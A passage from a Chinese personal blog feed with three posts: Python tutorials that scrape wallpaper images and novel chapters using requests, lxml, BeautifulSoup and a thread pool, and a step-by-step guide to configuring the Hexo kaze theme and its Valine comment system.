<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.42&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;./pic/&quot;</span>):</span><br><span class="line">    os.makedirs(<span class="string">&quot;./pic/&quot;</span>)</span><br><span class="line"></span><br><span class="line">url_list = []</span><br><span class="line">page = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pic_path</span>():</span><br><span class="line">    <span class="keyword">global</span> page,url_list</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        page = <span class="built_in">input</span>(<span class="string">&quot;输入下载页数：&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            page = <span class="built_in">int</span>(page)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;输入页数有误！&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> page == <span class="number">1</span>:</span><br><span class="line">            url = <span class="string">&quot;https://pic.netbian.com/4kdongman/index.html&quot;</span></span><br><span class="line">            <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> page &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, page + <span class="number">1</span>):</span><br><span class="line">                url_list.append(<span class="string">&quot;https://pic.netbian.com/4kdongman/index.html&quot;</span>)</span><br><span class="line">                url_list.append(<span class="string">&quot;https://pic.netbian.com/4kdongman/index_&#123;&#125;.html&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;输入页数有误！&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">url</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> url <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        response = requests.get(url, headers=headers).text.encode(<span class="string">&#x27;iso-8859-1&#x27;</span>)</span><br><span class="line">        Batch_processing(response)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">            response = requests.get(url, headers=headers).text.encode(<span class="string">&#x27;iso-8859-1&#x27;</span>)</span><br><span class="line">            Batch_processing(response)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Batch_processing</span>(<span class="params">response</span>):</span><br><span class="line">    tree = etree.HTML(response)</span><br><span class="line">    pic_list = tree.xpath(<span class="string">&#x27;//*[@id=&quot;main&quot;]/div[3]/ul/li&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> pic_list_item <span class="keyword">in</span> pic_list:</span><br><span class="line"></span><br><span class="line">        html_url = <span class="string">&quot;https://pic.netbian.com&quot;</span> + pic_list_item.xpath(<span class="string">&#x27;a/img/@src&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        name_pat = pic_list_item.xpath(<span class="string">&#x27;a/b/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(html_url)</span><br><span class="line">        <span class="built_in">print</span>(name_pat)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            name = <span class="built_in">str</span>(name_pat.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;_&quot;</span>) + <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">            name = <span class="built_in">str</span>(name.replace(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;&quot;</span>))  <span class="comment"># 处理文件名中含有*的情况，有些文件名中含有*会导致文件无法保存</span></span><br><span class="line">            pic_get = requests.get(html_url, headers=headers).content</span><br><span class="line"></span><br><span class="line">            pic_save_path = <span class="string">&quot;./pic/&quot;</span> + name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(pic_save_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(pic_get)</span><br><span class="line">                <span class="built_in">print</span>(name + <span class="string">&quot;下载完成！&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> :</span><br><span class="line">            <span class="built_in">print</span>(name + <span class="string">&quot;下载失败！&quot;</span>)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = pic_path()</span><br><span class="line">    download(url)</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>我的思路是首先把一些无用的资源放到外面，减少资源的浪费，比如说<code>headers</code>、<code>url_list</code>、<code>page</code>，比较headers用的话只用他的常量，放到循环里面，不断的加载他却不用，就是资源的浪费。</p>
</blockquote>
<blockquote>
<p>毕竟第一页和其他页并没有什么规律，我就打算把其他页的url都放到<code>url_list</code>里面。</p>
</blockquote>
<blockquote>
<p>对于page在外面就是随便设置的一个量，你设置1000000000000000也没有问题，我们主要是用page判断你要下载的页面数量，肯定是要立马获取的，一进入程序就会把page的值进行修改，所以我觉得还是放到外面比较好。</p>
</blockquote>
<p>首先，我们定义了一个函数<code>pic_path()</code>,在这个函数里面，我们先把<code>page</code>和url_list都放到全局变量里面,因为我们要在函数中改变<code>page</code>的值，所以用全局变量，让其他的函数可以访问到。</p>
<p>之后，我们用<code>input</code>获取我们要下载的页数，然后用<code>try except</code>来判断输入的是否为数字，如果不是数字，就提示输入有误，如果是数字，就判断是否大于1，如果大于1，就把url_list里面添加url(毕竟第一页和其他页没有联系，所以我们就直接把直接把第一页的url放到url_list里面)，如果等于1，就返回url。</p>
<p>所以当我们要下载的页数超过两页的时候，我们就让函数遍历url_list，获取url。</p>
<p>然后，我们定义了一个函数<code>download(url)</code>,这个函数就是用来下载图片的，我们先判断url是否为None，如果不是None，就说明是第一页，我们就直接调用<code>Batch_processing(response)</code>函数，如果是None，就说明不是第一页，我们就遍历url_list，调用<code>Batch_processing(response)</code>函数。</p>
<p>然后，我们定义了一个函数<code>Batch_processing(response)</code>,这个函数就是用来处理图片的，我们先用<code>etree</code>来解析网页内容，然后用<code>xpath</code>来获取图片的url和名字，然后用<code>requests</code>来获取图片的内容，然后用<code>os</code>来判断图片保存路径是否存在，不存在则创建，然后用<code>with open(pic_save_path, &#39;wb&#39;) as f:</code>来写入图片内容，最后打印下载完成。</p>
<p>最后，我们用<code>if __name__ == &#39;__main__&#39;:</code>来判断是否是主函数，如果是，就调用<code>pic_path()</code>函数，获取url，然后调用<code>download(url)</code>函数，开始下载图片。</p>
<p>这样，我们就实现了下载所有页面的图片。</p>
<hr>
<h1 id="如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！"><a href="#如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！" class="headerlink" title="如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！"></a>如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！</h1><blockquote>
<p>爱发电地址:<a class="link"   href="https://afdian.com/a/AuroraBreeze" >https://afdian.com/a/AuroraBreeze <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>kaze主题配置建议</title>
    <url>/2024/06/21/kaze%E9%85%8D%E7%BD%AE%E5%BB%BA%E8%AE%AE/</url>
    <content><![CDATA[<blockquote>
<p>因为<code>kaze</code>的主题配置文档已经看不了了，而且<code>kaze</code>的github也已经一年多没有进行提交了，并且<code>kaze</code>的主题用的人并不多，所以我就把我摸索的知识来分享一下。</p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>请先安装好<code>hexo</code>及<code>kaze</code>主题。</p>
<h2 id="修改为中文页面"><a href="#修改为中文页面" class="headerlink" title="修改为中文页面"></a>修改为中文页面</h2><p><code>kaze</code>主题默认为英文，所以需要修改为中文，但是修改为中文的配置文件并不在<code>kaze</code>主题的<code>-config.yml</code>文件中，而是在<code>hexo</code>的<code>_config.yml</code>文件中。</p>
<p>所以我们去hexo的<code>_config.yml</code>文件中找到<code>language</code>字段，将其修改为<code>zh-CN</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_11-11-02.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_11-12-52.png"
                     
                ></p>
<p>修改完成后，我们的主题页面就变成了中文了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_11-14-07.png"
                     
                ></p>
<hr>
<h2 id="删除不必要的页面"><a href="#删除不必要的页面" class="headerlink" title="删除不必要的页面"></a>删除不必要的页面</h2><p><code>kaze</code>主题有很多页面，其中有些页面似乎并没有布置好，我们进去后发现这些页面都是空白的，所以我们可以将这些页面删除掉。</p>
<p>在这里我们只需要把那些没有用的页面进行注释掉就可以了。</p>
<p>在<code>kaze</code>的<code>_config.yml</code>中注释掉<code>about</code>页面的配置，可以参照我的配置。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_11-17-55.png"
                     
                ></p>
<p>当然要告诉你的一点是，友链的<code>link</code>并没有中文，所以这里我们手动把他改为中文。</p>
<hr>
<h2 id="kaze主题的-config-yml配置"><a href="#kaze主题的-config-yml配置" class="headerlink" title="kaze主题的_config.yml配置"></a>kaze主题的<code>_config.yml</code>配置</h2><p>下面大家可以根据图片进行对应配置<br>。</p>
<hr>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_11-23-29.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_11-24-52.png"
                     
                ></p>
<hr>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_11-26-11.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_11-28-21.png"
                     
                ></p>
<p>这里图片上传的方式是图床，大家可以去网上找些免费的图床。</p>
<p>不过，我还是推荐用自己的文件夹放图片，一是不用担心钱的问题，二是可以自己管理图片，不用担心博客文章里的图片丢失。</p>
<p>这是我配置图片的信息，给大家看看。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_11-31-19.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_11-31-53.png"
                     
                ></p>
<p>我直接在<code>hexo</code>的<code>source</code>文件夹中创建了这两个放图片的文件夹。</p>
<p>不过，我这种方式有点烂，我还是比较推荐在<code>source</code>文件中只建一个文件夹专门放图片，然后再在创建的文件夹中再创建各个博客文章要用的文件夹，这样方便管理。</p>
<p>这是我在markdown语言中对图片的引用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_11-35-10.png"
                     
                ></p>
<p>用<code>..</code>表示上一级目录，这样再进入创建的文件夹里拿图片就可以了。</p>
<hr>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_11-37-17.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_11-38-12.png"
                     
                ></p>
<p>这个链接是有官方的配置的，图标只能用官方的，而且官方的的图标并不多，大家可以去这个网站来看看：</p>
<p><a class="link"   href="https://www.cnblogs.com/yuanlinblog/p/16654439.html" >https://www.cnblogs.com/yuanlinblog/p/16654439.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_13-17-44.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_13-18-50.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_13-19-16.png"
                     
                ></p>
<p>这个就是<strong>友链</strong>，我们可以把他的名字什么的改了，<code>avatar</code>是头像，这里要放头像的链接，<code>description</code>就是描述了，当然这里你可以放许多的人。</p>
<hr>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_13-22-35.png"
                     
                ></p>
<blockquote>
<p>注意：<code>kaze</code>的搜索默认关闭，所以我们要把<code>enable</code>改为<code>true</code>才会开启搜索功能。其他的地方就不需要改动了。</p>
</blockquote>
<hr>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_13-24-49.png"
                     
                > </p>
<p>注意：<code>kaze</code>的访问统计是不可用的，开启了也是统计错误的访问次数，所以我们关闭，其他的看注释就好了。</p>
<hr>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_13-26-48.png"
                     
                ></p>
<p><code>kaze</code>主题的评论是默认关闭的，我们把<code>enable</code>改为<code>true</code>就开启了评论功能。</p>
<p>评论用的插件是<code>valine</code>，这需要我们注册一个<code>leancloud</code>账号，然后在<code>valine</code>的<code>_config.yml</code>文件中填入自己的<code>app_id</code>和<code>app_key</code>。</p>
<p>大家要去：<a class="link"   href="https://console.leancloud.cn/" >https://console.leancloud.cn/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 注册一个<code>leancloud</code>账号，然后创建一个应用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_13-30-00.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_13-30-55.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_13-31-15.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_13-32-08.png"
                     
                ></p>
<p>然后我们在<code>valine</code>的<code>_config.yml</code>文件中填入自己的<code>app_id</code>和<code>app_key</code>，这样我们就可以用评论功能了。</p>
<p>具体使用可以去<code>valine</code>的官方文档看看：<a class="link"   href="https://valine.js.org/quickstart.html" >https://valine.js.org/quickstart.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_13-34-48.png"
                     
                ></p>
<p>这三个箭头分别是数学公式的渲染（默认关闭），代码块的渲染，以及文章字数统计（默认开启）文章的统计分析（默认关闭）。</p>
<hr>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_13-37-44.png"
                     
                ></p>
<p>这里改字体大小</p>
<hr>
<h2 id="博客文章的配置"><a href="#博客文章的配置" class="headerlink" title="博客文章的配置"></a>博客文章的配置</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_13-39-22.png"
                     
                ></p>
<p>title：文章标题</p>
<p>date：文章日期</p>
<p>tags：文章标签</p>
<p>categories：文章分类</p>
<p>对应的也就是</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_13-41-42.png"
                     
                ></p>
<hr>
<p>我们的博客的文章底部也需要修改</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_13-43-37.png"
                     
                ></p>
<p>不修改的话，文章链接是错误的。</p>
<blockquote>
<p>注意：这里文章的链接修改不在<code>kaze</code>的配置文件<code>_config.yml</code>中，而是在<code>hexo</code>的<code>_config.yml</code>文件中,所以我们去<code>hexo</code>的配置文件中修改。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/hexo_kaze_2/Snipaste_2024-06-21_13-46-08.png"
                     
                ></p>
<p>在这里把自己的博客地址放上就可以了。</p>
<hr>
<h1 id="如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！"><a href="#如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！" class="headerlink" title="如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！"></a>如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！</h1><blockquote>
<p>爱发电地址:<a class="link"   href="https://afdian.com/a/AuroraBreeze" >https://afdian.com/a/AuroraBreeze <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>kaze</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫系列:beautifulsoup爬虫与线程池</title>
    <url>/2024/06/21/python%E7%88%AC%E8%99%AB%E7%B3%BB%E5%88%97-beautifulsoup%E7%88%AC%E8%99%AB%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%B1%A0/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章，也是对CSDN文章的修改，使用beautifulsoup爬取网页，并使用线程池提高爬取速度。</p>
<h2 id="Python代码"><a href="#Python代码" class="headerlink" title="Python代码"></a>Python代码</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor <span class="comment">#导入线程池，加速爬取</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;webspider_book&quot;</span>):</span><br><span class="line">    os.mkdir(<span class="string">&quot;webspider_book&quot;</span>)</span><br><span class="line"></span><br><span class="line">url =<span class="string">&quot; https://www.bigee.cc/book/78647/&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_url</span>(<span class="params">url</span>):<span class="comment">#要用两次直接写个函数算了</span></span><br><span class="line">    res = requests.get(url,headers=headers)</span><br><span class="line">    soup = BeautifulSoup(res.text,<span class="string">&quot;lxml&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> soup</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_max_page</span>(<span class="params">url</span>): <span class="comment">#获取下载的最大页数</span></span><br><span class="line">    <span class="built_in">list</span> = get_url(url).select(<span class="string">&quot;body &gt; div.listmain &gt; dl &gt; dd a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    page_finall = re.findall(<span class="string">r&quot;/book/78647/(.*).html&quot;</span>, <span class="built_in">str</span>(<span class="built_in">list</span>[-<span class="number">1</span>][<span class="string">&#x27;href&#x27;</span>]))[<span class="number">0</span>] <span class="comment">#正则匹配最后一个章节的页码</span></span><br><span class="line">    <span class="comment">#print(page_finall)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page_finall <span class="comment">#返回最大页数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_book_content</span>(<span class="params">url</span>):<span class="comment">#下载单个页面的函数</span></span><br><span class="line"></span><br><span class="line">    soup = get_url(url)</span><br><span class="line">    name = soup.select(<span class="string">&quot;#read &gt; div.book.reader &gt; div.content &gt; h1&quot;</span>)[<span class="number">0</span>].get_text()</span><br><span class="line">    <span class="comment">#print(name)</span></span><br><span class="line">    content = soup.select(<span class="string">&quot;#chaptercontent&quot;</span>) <span class="comment">#获取章节内容</span></span><br><span class="line">    content = <span class="built_in">str</span>(content[<span class="number">0</span>].get_text()) <span class="comment">#获取章节内容</span></span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">f&quot;webspider_book/<span class="subst">&#123;name&#125;</span>.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    f.write(content)<span class="comment">#写入文件</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span>下载完成----------&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    num = <span class="built_in">int</span>(get_max_page(url=url))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;共<span class="subst">&#123;num&#125;</span>页----------&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(<span class="number">100</span>) <span class="keyword">as</span> t: <span class="comment">#线程池大小为100</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,num+<span class="number">1</span>):</span><br><span class="line">            t.submit(get_book_content,<span class="string">f&quot;https://www.bigee.cc/book/78647/<span class="subst">&#123;i&#125;</span>.html&quot;</span>) <span class="comment">#提交任务</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;线程池执行完毕&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><hr>
<p>我们需要下载的是<code>requests</code>和<code>beautifulsoup4</code>库，如果没有安装，请使用以下命令安装,<code>lxml</code>也需要下载。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">pip install beautifulsoup4</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">pip install lxml</span><br></pre></td></tr></table></figure></div>

<hr>
<p>对于线程池，我们需要导入<code>concurrent.futures</code>库，并创建一个<code>ThreadPoolExecutor</code>对象，这个就不需要下载了，这是自带的，对于<code>concurren.futures</code>的使用，我们这里只讲解一下<code>ThreadPoolExecutor</code>的使用，其他的内容大家自行探索。</p>
<hr>
<h3 id="代码-分析"><a href="#代码-分析" class="headerlink" title="代码:分析"></a>代码:分析</h3><p><strong>思路分析</strong></p>
<p>这次我们的目标是爬取目标网站的小说，下载下来并用线程池加速下载,目标网址为：</p>
<p><a class="link"   href="https://www.bigee.cc/book/78647/" >https://www.bigee.cc/book/78647/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>好了，想要爬去内容，我们需要先分析网站的结构，去看看我们要爬取的内容在哪里。</p>
<blockquote>
<p>按 <strong>F12</strong> 进入开发者工具</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_bs4_2/Snipaste_2024-06-21_17-03-30.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_bs4_2/Snipaste_2024-06-21_17-10-46.png"
                     
                ></p>
<p>这样我们就可以看到了小说的地址到底是不是，我们可以进去看一看。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_bs4_2/Snipaste_2024-06-21_17-12-54.png"
                     
                ></p>
<p>我们也知道，我们看到的是相对的位置，然后我们在小说内容的部分看到了他的地址</p>
<blockquote>
<p><a class="link"   href="https://www.bigee.cc/book/78647/1.html" >https://www.bigee.cc/book/78647/1.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>我们看到的相对位置</p>
<blockquote>
<p>&#x2F;book&#x2F;78647&#x2F;1.html</p>
</blockquote>
<p>我们这样就察觉到他们之间不就只差了一个<code>https://www.bigee.cc</code>吗？到时候我们只需要拼接一下，就可以拿到我们想要的页面的url了。</p>
<p>我们再看其他章节的地址，我们可以看到，他们的地址都是类似的，只是最后的数字不同。</p>
<blockquote>
<p><a class="link"   href="https://www.bigee.cc/book/78647/2.html" >https://www.bigee.cc/book/78647/2.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<blockquote>
<p><a class="link"   href="https://www.bigee.cc/book/78647/3.html" >https://www.bigee.cc/book/78647/3.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_bs4_2/Snipaste_2024-06-21_17-16-45.png"
                     
                ></p>
</blockquote>
<p>所以如果我们想要下载所有的章节，我们只需要遍历所有的数字，然后拼接一下就可以了。</p>
<p>那我们就需要先获取到这个最大的页码，然后遍历所有的数字，再在页面中下载内容就可以了。</p>
<h3 id="代码-获取最大页码"><a href="#代码-获取最大页码" class="headerlink" title="代码:获取最大页码"></a>代码:获取最大页码</h3><p>那我们现在要做的就是获取最大的页码，我们可以用<code>requests</code>和<code>beautifulsoup4</code>来获取。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url =<span class="string">&quot; https://www.bigee.cc/book/78647/&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;</span></span><br><span class="line">&#125; <span class="comment">#设置请求头,模拟浏览器</span></span><br><span class="line"></span><br><span class="line">res = requests.get(url,headers=headers).text<span class="comment">#获取网页内容</span></span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(res,<span class="string">&quot;lxml&quot;</span>)<span class="comment">#解析网页内容,加载lxml解析器</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = soup.select(<span class="string">&quot;body &gt; div.listmain &gt; dl &gt; dd a&quot;</span>)</span><br><span class="line"></span><br><span class="line">page_finall = re.findall(<span class="string">r&quot;/book/78647/(.*).html&quot;</span>,<span class="built_in">list</span>[-<span class="number">1</span>][<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(page_finall)</span><br></pre></td></tr></table></figure></div>

<p>这里我们使用<code>beautifulsoup</code>的<code>select</code>来获取到所有的章节的链接，也就是拿到所以我们匹配的<code>a</code>标签，这会生成一个列表。</p>
<p>对于BS4怎么去选择这个标签，我们也可以直接去浏览器进行复制，具体BS4的选择方法，大家可以自行探索。</p>
<p>下面是复制的步骤</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_bs4_2/Snipaste_2024-06-21_17-29-22.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
